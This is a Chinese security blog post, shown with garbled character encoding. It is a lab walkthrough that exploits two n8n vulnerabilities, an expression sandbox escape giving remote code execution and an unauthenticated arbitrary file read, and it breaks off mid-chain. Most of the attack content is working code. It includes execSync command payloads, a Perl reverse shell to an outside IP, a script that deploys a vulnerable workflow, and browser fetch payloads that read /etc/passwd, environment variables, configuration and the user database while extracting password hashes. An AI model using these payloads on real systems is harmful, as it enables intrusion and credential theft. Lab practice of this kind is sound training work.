#  å¥½é¶åœº-n8n-CVE-2026-21858+CVE-2025-68613  
æ³·ç¾½Secé™å®‰
                    æ³·ç¾½Secé™å®‰  å¥½é¶åœº   2026-01-19 01:51  
  
Â   
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpzoqtJ8ticekHLd2qIOOqxdBLMYpORttRHAB4PWpcLTEgicSG8JbRZibwg/640?wx_fmt=png&from=appmsg "null")  
  
  
> å…³æ³¨**æ³·ç¾½Sec**  
å’Œ**æ³·ç¾½Sec-é™å®‰**  
å…¬ä¼—å·ï¼Œè¿™é‡Œä¼šå®šæœŸæ›´æ–°ä¸ OSCPã€æ¸—é€æµ‹è¯•ç­‰ç›¸å…³çš„æœ€æ–°æ–‡ç« ï¼Œå¸®åŠ©ä½ ç†è§£ç½‘ç»œå®‰å…¨é¢†åŸŸçš„æœ€æ–°åŠ¨æ€ã€‚  
  
  
å­¦å®‰å…¨ï¼Œåˆ«åªçœ‹ä¹¦ä¸Šæ‰‹ç»ƒï¼Œå°±æ¥å¥½é¶åœºï¼Œæœ¬WPé¶åœºå·²å¼€æ”¾ï¼Œæ¬¢è¿ä½“éªŒï¼š  
  
ğŸ”— å…¥å£ï¼šhttp://www.loveli.com.cn/see_bug_one?id=581  
  
âœ… é‚€è¯·ç ï¼š48ffd1d7eba24bf4  
  
ğŸ å¡«å†™å³é¢† 7 å¤©é«˜çº§ä¼šå‘˜ï¼Œè§£é”æ›´å¤šæ¼æ´å®æˆ˜ç¯å¢ƒï¼å¿«æ¥ä¸€èµ·å®æˆ˜å§ï¼ğŸ‘‡  
  
å› ä¸ºæ˜¯éå¸¸ç«çš„æ´ï¼ŒGithubä¸Šä¸€æœå°±æœ‰poc  
## CVE-2025-68613 çš„è¿›å…¥æ–¹æ³•  
  
https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/n8n%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2025-68613.md  
  
[[CVE-2025-68613 n8n è¡¨è¾¾å¼æ²™ç®±é€ƒé€¸å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´]]  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpRd2OLelDResuocjicRCSgB5jmM08kSMlX4ibiajL6cbMZttlT0M81KCIw/640?wx_fmt=png&from=appmsg "null")  
  
  
  
æ‰“å¼€é¡µé¢ï¼Œéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·### åˆ›å»º Edit Fields(Set) èŠ‚ç‚¹  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpicH3WUuAb9Zw3Doia0jBuQSvT70VmiaKRJpesdMIK6JkYYIqkmBMdRAaA/640?wx_fmt=png&from=appmsg "null")  
  
  
  
åˆ›å»ºä¸€ä¸ªæ–°çš„ Workflow å¹¶æ·»åŠ ä¸€ä¸ª Manual Trigger èŠ‚ç‚¹ï¼Œæ·»åŠ  Edit Fields(Set) é€‰é¡¹ï¼š  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54Bp52RKic2drRB7Pq53HXKUEdLAxsrMEGy461tQZuHMbG9aUdIgicQYUgDQ/640?wx_fmt=png&from=appmsg "null")  
  
  
  
ç‚¹å‡» Add Fieldï¼Œæ­¤å¤„éœ€è¦å¡«å†™Â name  
Â å’ŒÂ value  
ã€‚name  
Â å¤„å¡«å…¥ä»»æ„å†…å®¹ï¼Œåœ¨Â value  
Â å¤„å¡«å…¥ä»¥ä¸‹ä»£ç ï¼Œåˆ‡æ¢åˆ° Expressionã€‚ç‚¹å‡» Test step æµ‹è¯•æ‰§è¡Œï¼š```
{{Â (function(){Â return this.process.mainModule.require('child_process').execSync('id').toString()Â })()Â }}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpoRicFGAynqlxnHARpDTA1Mia7FbG7fRbFBuVqtCibvVtn6b20rK6K1u3g/640?wx_fmt=png&from=appmsg "null")  
  
  
æœ€ålsç›®å½•å‘ç°flagåœ¨/tmpç›®å½•ä¸‹ã€‚  
```
{{Â (function(){Â return this.process.mainModule.require('child_process').execSync('cat /tmp/flag.txt').toString()Â })()Â }}
```  
  
flag{93c67d9043f045b399fe6896b10395dc}  
### æˆ–è€…åˆ›å»ºexecèŠ‚ç‚¹ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼ˆæ³¨æ„æœ‰æ²¡æœ‰æƒé™ï¼‰  
  
ç›´æ¥æ–°å»ºä¸€ä¸ªexecèŠ‚ç‚¹  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpxWZspqkZrQxsqwIticVTKMKCIg3VSP5PAqNjBlS788oIXFXw3jgRdQA/640?wx_fmt=png&from=appmsg "null")  
  
  
æƒ³è¦å¼¹å›shellå‘ç°æ²¡æœ‰ncä¹Ÿæ²¡æœ‰pythonï¼Œls /bin  
Â å‘ç°æœ‰perl, perlä¹Ÿå¯ä»¥å¼¹  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpBwGT8DxHDBUy4D2fcy2iaPvsMiaQKewZQHt4KBia8KbjgnrPTN5I7lOMA/640?wx_fmt=png&from=appmsg "null")  
  
```
perl -eÂ 'use Socket;$i="å…¬ç½‘ip";$p=4777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpG13IwHicAnbqmRqUsw3iaVV3bRSlmoRpIibLfJoF2qtdZUpvVBjdd6AFw/640?wx_fmt=png&from=appmsg "null")  
  
  
flag{c006fa82940946b1a5c261198dfba1c5}  
## CVE-2026-21858 çš„è¿›å…¥æ–¹æ³•  
  
https://github.com/Chocapikk/CVE-2026-21858  
  
æŠŠä¸‹é¢çš„ä»£ç ä¿å­˜ä¸ºn8n_vuln_workflow.py  
æ–‡ä»¶  
```
#!/usr/bin/env python3"""CVE-2026-21858 æ¼æ´å·¥ä½œæµéƒ¨ç½²è„šæœ¬ç”¨äºåœ¨å·²çŸ¥ç™»å½•å‡­æ®çš„n8nå®ä¾‹ä¸Šéƒ¨ç½²æ˜“å—æ”»å‡»çš„å·¥ä½œæµé…ç½®"""importÂ requestsimportÂ jsonimportÂ sysimportÂ argparse# æ­£ç¡®çš„æ¼æ´å·¥ä½œæµé…ç½®ï¼ˆä¸ä½ æä¾›çš„é…ç½®ä¸€è‡´ï¼‰VULNERABLE_WORKFLOW = {Â  Â  "name":Â "Vulnerable Form",Â  Â  "nodes": [Â  Â  Â  Â  {Â  Â  Â  Â  Â  Â  "parameters": {Â  Â  Â  Â  Â  Â  Â  Â  "formTitle":Â "Upload",Â  Â  Â  Â  Â  Â  Â  Â  "formFields": {Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "values": [Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  {Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "fieldLabel":Â "document",Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "fieldType":Â "file"Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  }Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  ]Â  Â  Â  Â  Â  Â  Â  Â  },Â  Â  Â  Â  Â  Â  Â  Â  "responseMode":Â "responseNode",Â  Â  Â  Â  Â  Â  Â  Â  "options": {}Â  Â  Â  Â  Â  Â  },Â  Â  Â  Â  Â  Â  "id":Â "trigger",Â  Â  Â  Â  Â  Â  "name":Â "Form Trigger",Â  Â  Â  Â  Â  Â  "type":Â "n8n-nodes-base.formTrigger",Â  Â  Â  Â  Â  Â  "typeVersion":Â 2.2,Â  Â  Â  Â  Â  Â  "position": [0,Â 0],Â  Â  Â  Â  Â  Â  "webhookId":Â "vulnerable-form"Â  Â  Â  Â  },Â  Â  Â  Â  {Â  Â  Â  Â  Â  Â  "parameters": {Â  Â  Â  Â  Â  Â  Â  Â  "respondWith":Â "binary",Â  Â  Â  Â  Â  Â  Â  Â  "options": {}Â  Â  Â  Â  Â  Â  },Â  Â  Â  Â  Â  Â  "id":Â "respond",Â  Â  Â  Â  Â  Â  "name":Â "Respond",Â  Â  Â  Â  Â  Â  "type":Â "n8n-nodes-base.respondToWebhook",Â  Â  Â  Â  Â  Â  "typeVersion":Â 1.1,Â  Â  Â  Â  Â  Â  "position": [300,Â 0]Â  Â  Â  Â  }Â  Â  ],Â  Â  "pinData": {},Â  Â  "connections": {Â  Â  Â  Â  "Form Trigger": {Â  Â  Â  Â  Â  Â  "main": [Â  Â  Â  Â  Â  Â  Â  Â  [Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  {Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "node":Â "Respond",Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "type":Â "main",Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  "index":Â 0Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  }Â  Â  Â  Â  Â  Â  Â  Â  ]Â  Â  Â  Â  Â  Â  ]Â  Â  Â  Â  }Â  Â  },Â  Â  "active":Â True,Â  Â  "settings": {Â  Â  Â  Â  "executionOrder":Â "v1"Â  Â  },Â  Â  "tags": []}defÂ login_n8n(base_url, email, password):Â  Â  """ç™»å½•n8nå¹¶è¿”å›session"""Â  Â  session = requests.Session()Â  Â Â Â  Â  print(f"[*] æ­£åœ¨ç™»å½•Â {base_url}...")Â  Â  print(f" Â  Â é‚®ç®±:Â {email}")Â  Â Â Â  Â  try:Â  Â  Â  Â  login_resp = session.post(Â  Â  Â  Â  Â  Â  f"{base_url}/rest/login",Â  Â  Â  Â  Â  Â  json={"email": email,Â "password": password},Â  Â  Â  Â  Â  Â  timeout=15Â  Â  Â  Â  )Â  Â  Â  Â Â Â  Â  Â  Â  ifÂ login_resp.status_code ==Â 200:Â  Â  Â  Â  Â  Â  print("[âœ“] ç™»å½•æˆåŠŸ")Â  Â  Â  Â  Â  Â  returnÂ sessionÂ  Â  Â  Â  else:Â  Â  Â  Â  Â  Â  print(f"[âœ—] ç™»å½•å¤±è´¥: HTTPÂ {login_resp.status_code}")Â  Â  Â  Â  Â  Â  print(f" Â  Â å“åº”:Â {login_resp.text[:200]}")Â  Â  Â  Â  Â  Â  returnÂ NoneÂ  Â  Â  Â  Â  Â Â Â  Â  exceptÂ requests.exceptions.RequestExceptionÂ asÂ e:Â  Â  Â  Â  print(f"[âœ—] è¿æ¥å¤±è´¥:Â {e}")Â  Â  Â  Â  returnÂ NonedefÂ check_existing_workflow(session, base_url):Â  Â  """æ£€æŸ¥æ˜¯å¦å·²å­˜åœ¨åŒåå·¥ä½œæµ"""Â  Â  try:Â  Â  Â  Â  resp = session.get(f"{base_url}/rest/workflows", timeout=10)Â  Â  Â  Â  ifÂ resp.ok:Â  Â  Â  Â  Â  Â  workflows = resp.json().get('data', [])Â  Â  Â  Â  Â  Â  forÂ wfÂ inÂ workflows:Â  Â  Â  Â  Â  Â  Â  Â  ifÂ wf.get('name') ==Â 'Vulnerable Form':Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  returnÂ wf.get('id')Â  Â  Â  Â  returnÂ NoneÂ  Â  except:Â  Â  Â  Â  returnÂ NonedefÂ delete_workflow(session, base_url, workflow_id):Â  Â  """åˆ é™¤å·²å­˜åœ¨çš„å·¥ä½œæµ"""Â  Â  try:Â  Â  Â  Â  resp = session.delete(f"{base_url}/rest/workflows/{workflow_id}", timeout=10)Â  Â  Â  Â  returnÂ resp.okÂ  Â  except:Â  Â  Â  Â  returnÂ FalsedefÂ deploy_workflow(session, base_url):Â  Â  """éƒ¨ç½²æ¼æ´å·¥ä½œæµ"""Â  Â Â Â  Â  # æ£€æŸ¥æ˜¯å¦å·²å­˜åœ¨Â  Â  existing_id = check_existing_workflow(session, base_url)Â  Â  ifÂ existing_id:Â  Â  Â  Â  print(f"[!] å‘ç°å·²å­˜åœ¨çš„ 'Vulnerable Form' å·¥ä½œæµ (ID:Â {existing_id})")Â  Â  Â  Â  print("[*] æ­£åœ¨åˆ é™¤æ—§å·¥ä½œæµ...")Â  Â  Â  Â  ifÂ delete_workflow(session, base_url, existing_id):Â  Â  Â  Â  Â  Â  print("[âœ“] æ—§å·¥ä½œæµå·²åˆ é™¤")Â  Â  Â  Â  else:Â  Â  Â  Â  Â  Â  print("[!] åˆ é™¤å¤±è´¥ï¼Œç»§ç»­åˆ›å»º...")Â  Â Â Â  Â  print("[*] æ­£åœ¨åˆ›å»ºæ¼æ´å·¥ä½œæµ...")Â  Â Â Â  Â  try:Â  Â  Â  Â  create_resp = session.post(Â  Â  Â  Â  Â  Â  f"{base_url}/rest/workflows",Â  Â  Â  Â  Â  Â  json=VULNERABLE_WORKFLOW,Â  Â  Â  Â  Â  Â  timeout=15Â  Â  Â  Â  )Â  Â  Â  Â Â Â  Â  Â  Â  ifÂ notÂ create_resp.ok:Â  Â  Â  Â  Â  Â  print(f"[âœ—] åˆ›å»ºå¤±è´¥: HTTPÂ {create_resp.status_code}")Â  Â  Â  Â  Â  Â  print(f" Â  Â å“åº”:Â {create_resp.text[:500]}")Â  Â  Â  Â  Â  Â  returnÂ NoneÂ  Â  Â  Â Â Â  Â  Â  Â  workflow_data = create_resp.json().get('data', {})Â  Â  Â  Â  workflow_id = workflow_data.get('id')Â  Â  Â  Â Â Â  Â  Â  Â  ifÂ notÂ workflow_id:Â  Â  Â  Â  Â  Â  print("[âœ—] æ— æ³•è·å–å·¥ä½œæµID")Â  Â  Â  Â  Â  Â  print(f" Â  Â å“åº”:Â {create_resp.text[:500]}")Â  Â  Â  Â  Â  Â  returnÂ NoneÂ  Â  Â  Â Â Â  Â  Â  Â  print(f"[âœ“] å·¥ä½œæµåˆ›å»ºæˆåŠŸ!")Â  Â  Â  Â  print(f" Â  Â ID:Â {workflow_id}")Â  Â  Â  Â  print(f" Â  Â åç§°:Â {workflow_data.get('name')}")Â  Â  Â  Â Â Â  Â  Â  Â  # ç¡®ä¿å·¥ä½œæµå·²æ¿€æ´»Â  Â  Â  Â  print("[*] æ­£åœ¨æ¿€æ´»å·¥ä½œæµ...")Â  Â  Â  Â  activate_resp = session.patch(Â  Â  Â  Â  Â  Â  f"{base_url}/rest/workflows/{workflow_id}",Â  Â  Â  Â  Â  Â  json={"active":Â True},Â  Â  Â  Â  Â  Â  timeout=10Â  Â  Â  Â  )Â  Â  Â  Â Â Â  Â  Â  Â  ifÂ activate_resp.ok:Â  Â  Â  Â  Â  Â  print("[âœ“] å·¥ä½œæµå·²æ¿€æ´»")Â  Â  Â  Â  else:Â  Â  Â  Â  Â  Â  print(f"[!] æ¿€æ´»å¤±è´¥: HTTPÂ {activate_resp.status_code}")Â  Â  Â  Â  Â  Â  print(" Â  Â å·¥ä½œæµå·²åˆ›å»ºä½†æœªæ¿€æ´»ï¼Œè¯·æ‰‹åŠ¨æ¿€æ´»")Â  Â  Â  Â Â Â  Â  Â  Â  returnÂ workflow_idÂ  Â  Â  Â Â Â  Â  exceptÂ requests.exceptions.RequestExceptionÂ asÂ e:Â  Â  Â  Â  print(f"[âœ—] è¯·æ±‚å¤±è´¥:Â {e}")Â  Â  Â  Â  returnÂ NonedefÂ print_usage_instructions(base_url, workflow_id):Â  Â  """æ‰“å°ä½¿ç”¨è¯´æ˜"""Â  Â  webhook_url =Â f"{base_url}/form/vulnerable-form"Â  Â Â Â  Â  print("\n"Â +Â "="*70)Â  Â  print("éƒ¨ç½²æˆåŠŸ! æ¼æ´å·¥ä½œæµå·²å°±ç»ª")Â  Â  print("="*70)Â  Â Â Â  Â  print(f"\nğŸ“‹ å·¥ä½œæµä¿¡æ¯:")Â  Â  print(f" Â  ç®¡ç†ç•Œé¢:Â {base_url}/workflow/{workflow_id}")Â  Â  print(f" Â  Webhook URL:Â {webhook_url}")Â  Â Â Â  Â  print(f"\nğŸ” æµ‹è¯•æ¼æ´ - è¯»å–æ–‡ä»¶:")Â  Â  print(f"\n Â  # ä½¿ç”¨æµè§ˆå™¨æ§åˆ¶å°:")Â  Â  print(f""" Â  fetch('{webhook_url}', {{Â  Â  Â method: 'POST',Â  Â  Â headers: {{'Content-Type': 'application/json'}},Â  Â  Â body: JSON.stringify({{Â  Â  Â  Â data: {{}},Â  Â  Â  Â files: {{Â  Â  Â  Â  Â test: {{Â  Â  Â  Â  Â  Â filepath: '/etc/hostname',Â  Â  Â  Â  Â  Â originalFilename: 'test.txt',Â  Â  Â  Â  Â  Â mimetype: 'text/plain',Â  Â  Â  Â  Â  Â size: 100Â  Â  Â  Â  Â }}Â  Â  Â  Â }}Â  Â  Â }})Â  Â }})Â  Â .then(r => r.text())Â  Â .then(console.log);""")Â  Â Â Â  Â  print(f"\n Â  # æˆ–ä½¿ç”¨ curl:")Â  Â  print(f""" Â  curl -X POST '{webhook_url}' \\Â  Â  Â -H 'Content-Type: application/json' \\Â  Â  Â -d '{{"data":{{}}, "files":{{"test":{{"filepath":"/etc/hostname","originalFilename":"test.txt","mimetype":"text/plain","size":100}}}}}}'""")Â  Â Â Â  Â  print(f"\nğŸ¯ å®Œæ•´åˆ©ç”¨é“¾:")Â  Â  print(f" Â  1. è¯»å–é…ç½®: /root/.n8n/config æˆ– /home/node/.n8n/config")Â  Â  print(f" Â  2. è¯»å–æ•°æ®åº“: /root/.n8n/database.sqlite")Â  Â  print(f" Â  3. ä¼ªé€ JWTä»¤ç‰Œ")Â  Â  print(f" Â  4. ç™»å½•ç®¡ç†åå°")Â  Â  print(f" Â  5. åˆ›å»ºRCEå·¥ä½œæµ")Â  Â Â Â  Â  print("\n"Â +Â "="*70Â +Â "\n")defÂ main():Â  Â  parser = argparse.ArgumentParser(Â  Â  Â  Â  description='CVE-2026-21858 æ¼æ´å·¥ä½œæµéƒ¨ç½²è„šæœ¬',Â  Â  Â  Â  formatter_class=argparse.RawDescriptionHelpFormatter,Â  Â  Â  Â  epilog="""ç¤ºä¾‹:Â  python3 deploy_vuln_workflow.py http://target-ip:5678 admin@exploit.local password123Â  python3 deploy_vuln_workflow.py https://n8n.example.com admin@example.com MyP@ssw0rdÂ  Â  Â  Â  """Â  Â  )Â  Â Â Â  Â  parser.add_argument('url',Â help='n8nå®ä¾‹URL (ä¾‹: http://localhost:5678)')Â  Â  parser.add_argument('email',Â help='ç®¡ç†å‘˜é‚®ç®±')Â  Â  parser.add_argument('password',Â help='ç®¡ç†å‘˜å¯†ç ')Â  Â Â Â  Â  args = parser.parse_args()Â  Â Â Â  Â  # æ¸…ç†URLÂ  Â  base_url = args.url.rstrip('/')Â  Â Â Â  Â  print("="*70)Â  Â  print("CVE-2026-21858 æ¼æ´å·¥ä½œæµéƒ¨ç½²å·¥å…·")Â  Â  print("="*70)Â  Â  print(f"ç›®æ ‡:Â {base_url}")Â  Â  print(f"è´¦å·:Â {args.email}")Â  Â  print()Â  Â Â Â  Â  # ç™»å½•Â  Â  session = login_n8n(base_url, args.email, args.password)Â  Â  ifÂ notÂ session:Â  Â  Â  Â  print("\n[âœ—] éƒ¨ç½²å¤±è´¥: æ— æ³•ç™»å½•")Â  Â  Â  Â  sys.exit(1)Â  Â Â Â  Â  # éƒ¨ç½²å·¥ä½œæµÂ  Â  workflow_id = deploy_workflow(session, base_url)Â  Â  ifÂ notÂ workflow_id:Â  Â  Â  Â  print("\n[âœ—] éƒ¨ç½²å¤±è´¥: æ— æ³•åˆ›å»ºå·¥ä½œæµ")Â  Â  Â  Â  sys.exit(1)Â  Â Â Â  Â  # æ‰“å°ä½¿ç”¨è¯´æ˜Â  Â  print_usage_instructions(base_url, workflow_id)Â  Â Â Â  Â  sys.exit(0)ifÂ __name__ ==Â "__main__":Â  Â  main()
```  
  
ç„¶åè¿è¡Œï¼Œè¿™é‡Œçš„æ¨¡ä»¿çš„æ˜¯n8nçš„çœŸå®ç”¨æˆ·åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­â€œä¸å°å¿ƒâ€çš„â€œæ°å¥½â€åˆ›å»ºäº†è¿™æ ·çš„ä¸€ä¸ªå·¥ä½œæµçš„èŠ‚ç‚¹ã€‚  
```
python .\n8n_vuln_workflow.py http://target-ip:5678 111@111.com passwd
```  
  
è¿™ä¸ªèŠ‚ç‚¹æ˜¯æ¿€æ´»çŠ¶æ€ï¼Œè€Œä¸”æ˜¯fileé…ç½®ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpnJ9LghQkaMyUq5PljodMLwDW28VuItzH1cTKU7ricWmQMKNoy4OfCibw/640?wx_fmt=png&from=appmsg "null")  
  
  
ç‚¹å‡» http://8vccf5j.haobachang.loveli.com.cn:8888/form/vulnerable-form æ‰“å¼€å¯ä»¥çœ‹åˆ°æ–‡ä»¶ä¸Šä¼ çš„æ˜¾ç¤ºã€‚è¿™ä¸€æ­¥åœ¨å®é™…æ¸—é€è¿‡ç¨‹ä¸­æ˜¯ä¸éœ€è¦ç”¨æˆ·ç™»å½•çš„ï¼Œä»»æ„ç”¨æˆ·éƒ½çœ‹å¾—åˆ°è¿™ä¸ªç•Œé¢ï¼Œä¹Ÿå°±æ˜¯ä»»æ„è¯»å–ï¼Œå®ƒå¯ä»¥è®©æœªæˆæƒçš„ç”¨æˆ·è¯»åˆ°æ•æ„Ÿæ–‡ä»¶ã€‚å®é™…çš„CVE-2026-21858åˆ©ç”¨è¿‡ç¨‹æ˜¯ä»è¿™é‡Œå¼€å§‹çš„ï¼Œç°åœ¨å¿˜äº†ä¹‹å‰è®¾ç½®çš„å¯†ç å§ï¼Œå‡è£…ä½ ä¸çŸ¥é“ç™»å½•å¯†ç ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpIMBpibwETN8cTR8gbPoKDM7jkTC7bNoIVSVfSP4MTaCaW1lUYbicC9Wg/640?wx_fmt=png&from=appmsg "null")  
  
  
CVE-2025-68613 æ¼æ´è™½ç„¶å¯ä»¥RCEï¼Œä½†æ˜¯å‰ææ¡ä»¶æ˜¯çŸ¥é“n8nç³»ç»Ÿçš„ç™»å½•å¯†ç ï¼Œè€Œä¸”è¿™ä¸ªè´¦æˆ·è¿˜éœ€è¦æœ‰èŠ‚ç‚¹ç¼–è¾‘æƒé™ã€‚ä¹Ÿå°±æ˜¯å¿…é¡»ç™»å½•åˆ°ä¸‹å›¾è¿™æ ·èŠ‚ç‚¹ç¼–è¾‘çš„ç•Œé¢æ‰èƒ½æˆåŠŸæ‰§è¡Œï¼Œå¦‚æœä¸çŸ¥é“è´¦æˆ·å¯†ç ï¼Œæˆ–è€…ç™»å½•çš„è´¦æˆ·æ²¡æœ‰èŠ‚ç‚¹ç¼–è¾‘æƒé™çš„è¯å°±æ²¡åŠæ³•ï¼Œåªèƒ½å¹²çªçœ¼ã€‚è¿™æ—¶å€™CVE-2026-2185æ¥äº†ï¼Œè¿™ä¸ªæ¼æ´å¯ä»¥åœ¨ä¸ç™»é™†çš„æƒ…å†µä¸‹ï¼Œè·å¾—ç³»ç»Ÿä¸€äº›æ•æ„Ÿæ–‡ä»¶çš„è¯»å–æƒé™ï¼Œä»è€Œè®¿é—®æ¯”å¦‚Â /etc/passwd  
Â è¿™æ ·çš„æ–‡ä»¶è·å¾—å¯†ç ã€‚ä»è€Œå®ç°å®Œæ•´çš„æ”»å‡»é“¾æ¡ã€‚  
  
æŒ‰F12æ‰“å¼€æ§åˆ¶å°Consoleè¾“å…¥å¦‚ä¸‹å†…å®¹  
```
fetch('http://target-ip:5678/form/vulnerable-form', {Â  method:Â 'POST',Â  headers: {'Content-Type':Â 'application/json'},Â  body:Â JSON.stringify({Â  Â  data: {},Â  Â  files: {Â  Â  Â  test: {Â  Â  Â  Â  filepath:Â '/etc/passwd',Â  Â  Â  Â  originalFilename:Â 'test.txt',Â  Â  Â  Â  mimetype:Â 'text/plain',Â  Â  Â  Â  size:Â 100Â  Â  Â  }Â  Â  }Â  })}).then(rÂ =>Â r.text()).then(console.log)
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpGgDQbTExDGu6TH2LMIob8z6co7EceSTBGmWVs7wt2b9j5A2twjpGGA/640?wx_fmt=png&from=appmsg "null")  
  
  
ç¡®è®¤ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å­˜åœ¨ï¼Œç„¶åè¯»å–è®¡ç®—jwtæ‰€éœ€çš„æ–‡ä»¶ã€‚  
```
// 1. è¯»å–ç¯å¢ƒå˜é‡è·å–HOMEç›®å½•fetch('http://target-ip:5678/form/vulnerable-form', {Â  method:Â 'POST',Â  headers: {'Content-Type':Â 'application/json'},Â  body:Â JSON.stringify({Â  Â  data: {},Â  Â  files: {Â  Â  Â  test: {Â  Â  Â  Â  filepath:Â '/proc/self/environ',Â  Â  Â  Â  originalFilename:Â 'environ.txt',Â  Â  Â  Â  mimetype:Â 'text/plain',Â  Â  Â  Â  size:Â 1000Â  Â  Â  }Â  Â  }Â  })}).then(rÂ =>Â r.text()).then(dataÂ =>Â {Â  console.log('ç¯å¢ƒå˜é‡:', data);Â  // ä»è¾“å‡ºä¸­æ‰¾åˆ° HOME=/home/node æˆ– HOME=/root});// å¯èƒ½çš„é…ç½®æ–‡ä»¶è·¯å¾„constÂ configPaths = [Â  '/home/node/.n8n/config',Â  '/root/.n8n/config',Â  '/.n8n/config'];// å°è¯•è¯»å–é…ç½®asyncÂ functionÂ readConfig() {Â  forÂ (constÂ pathÂ ofÂ configPaths) {Â  Â  tryÂ {Â  Â  Â  constÂ response =Â awaitÂ fetch('http://target-ip:5678/form/vulnerable-form', {Â  Â  Â  Â  method:Â 'POST',Â  Â  Â  Â  headers: {'Content-Type':Â 'application/json'},Â  Â  Â  Â  body:Â JSON.stringify({Â  Â  Â  Â  Â  data: {},Â  Â  Â  Â  Â  files: {Â  Â  Â  Â  Â  Â  config: {Â  Â  Â  Â  Â  Â  Â  filepath: path,Â  Â  Â  Â  Â  Â  Â  originalFilename:Â 'config.json',Â  Â  Â  Â  Â  Â  Â  mimetype:Â 'application/json',Â  Â  Â  Â  Â  Â  Â  size:Â 10000Â  Â  Â  Â  Â  Â  }Â  Â  Â  Â  Â  }Â  Â  Â  Â  })Â  Â  Â  });Â  Â  Â Â Â  Â  Â  constÂ text =Â awaitÂ response.text();Â  Â  Â  ifÂ (!text.includes('error') && !text.includes('could not be started')) {Â  Â  Â  Â  console.log(`æˆåŠŸè¯»å–Â ${path}:`, text);Â  Â  Â  Â  returnÂ text;Â  Â  Â  }Â  Â  }Â catchÂ (e) {Â  Â  Â  console.log(`è¯»å–Â ${path}Â å¤±è´¥:`, e);Â  Â  }Â  }}readConfig();// æ–¹æ³•1: å°è¯•ä»¥æ–‡æœ¬å½¢å¼è¯»å–ï¼ˆSQLiteæœ‰äº›éƒ¨åˆ†æ˜¯å¯è¯»æ–‡æœ¬ï¼‰fetch('http://target-ip:5678/form/vulnerable-form', {Â  method:Â 'POST',Â  headers: {'Content-Type':Â 'application/json'},Â  body:Â JSON.stringify({Â  Â  data: {},Â  Â  files: {Â  Â  Â  db: {Â  Â  Â  Â  filepath:Â '/root/.n8n/database.sqlite',Â  Â  Â  Â  originalFilename:Â 'database.txt',Â  Â  Â  Â  mimetype:Â 'text/plain',Â  // æ”¹ä¸ºtext/plainÂ  Â  Â  Â  size:Â 500000Â  Â  Â  }Â  Â  }Â  })}).then(rÂ =>Â r.text()).then(dataÂ =>Â {Â  console.log('æ•°æ®åº“å†…å®¹ï¼ˆå¯èƒ½æ˜¯äºŒè¿›åˆ¶+æ–‡æœ¬æ··åˆï¼‰:', data);Â Â Â  // å°è¯•æå–é‚®ç®±åœ°å€ï¼ˆé€šå¸¸æ˜¯å¯è¯»æ–‡æœ¬ï¼‰Â  constÂ emailMatches = data.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);Â  console.log('æ‰¾åˆ°çš„é‚®ç®±:', emailMatches);Â Â Â  // å°è¯•æå–bcryptå¯†ç å“ˆå¸ŒÂ  constÂ bcryptMatches = data.match(/\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}/g);Â  console.log('æ‰¾åˆ°çš„å¯†ç å“ˆå¸Œ:', bcryptMatches);Â Â Â  // å°è¯•æå–UUIDï¼ˆç”¨æˆ·IDï¼‰Â  constÂ uuidMatches = data.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi);Â  console.log('æ‰¾åˆ°çš„UUID:', uuidMatches);});
```  
  
å¾—åˆ°  
  
